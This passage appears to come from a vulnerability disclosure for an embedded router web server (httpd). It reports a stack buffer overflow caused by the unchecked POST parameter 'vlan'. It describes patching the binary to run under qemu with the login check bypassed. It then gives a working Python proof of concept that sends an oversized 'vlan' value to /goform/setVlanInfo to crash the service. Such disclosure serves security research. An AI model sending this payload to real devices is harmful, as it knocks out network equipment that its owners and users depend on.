In this function, is copies POST parameter `vlan` to stack buffer without checking its length, causing a stack buffer overflow vulnerability. 

**It is similar to [this vuln](https://github.com/xxy1126/Vuln/tree/main/5), but the parameter is different**

### 2. Recurring loopholes and POC

use qemu-arm-static to run the `httpd`, we need to patch it before run. 

- in `main` function, The `ConnectCfm` function didnâ€™t work properly, so I patched it to `NOP` 
- The `R7WebsSecurityHandler` function is used for permission control, and I've modified it to access URLs that can only be accessed after login

poc of DOS(deny of service)

```python
import requests

data = {
    "action": "add", 
    "vlan": "a"*0x300
}
cookies = {
    "user": "admin"
}
res = requests.post("http://127.0.0.1/goform/setVlanInfo", data=data, cookies=cookies)
print(res.content)

```
